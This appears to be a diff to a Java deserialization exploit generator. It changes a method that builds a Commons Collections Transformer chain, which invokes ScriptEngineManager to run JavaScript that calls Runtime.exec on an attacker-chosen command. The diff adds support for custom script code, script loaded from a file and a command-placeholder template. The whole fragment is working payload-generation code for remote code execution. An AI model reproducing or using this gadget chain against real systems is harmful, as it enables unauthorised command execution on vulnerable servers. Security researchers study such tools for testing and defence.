@@ -91,8 +91,29 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.ScriptEngine})
     public Transformer[] scriptEngine(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
+        String code = sinksHelper.getCode();
+        String codeFile = sinksHelper.getCodeFile();
+        if (code == null) {
+            code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
+        }
 
-        String code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
+        if (codeFile != null) {
+            try {
+                FileInputStream fileInputStream = new FileInputStream(codeFile);
+                byte[] codeBytes = new byte[fileInputStream.available()];
+                fileInputStream.read(codeBytes);
+                fileInputStream.close();
+                code = new String(codeBytes);
+            } catch (Exception e) {
+                Printer.error("File read error");
+            }
+        }
+
+        // 模板替换 -cmd -> [ppp]
+        code = code.replaceAll("\\[ppp\\]", command);
+
+        Printer.greenInfo(String.format("js code is %s: ", code));
+
         return new Transformer[]{
                 new ConstantTransformer(ScriptEngineManager.class),
                 new InstantiateTransformer(new Class[]{}, new Object[]{}),
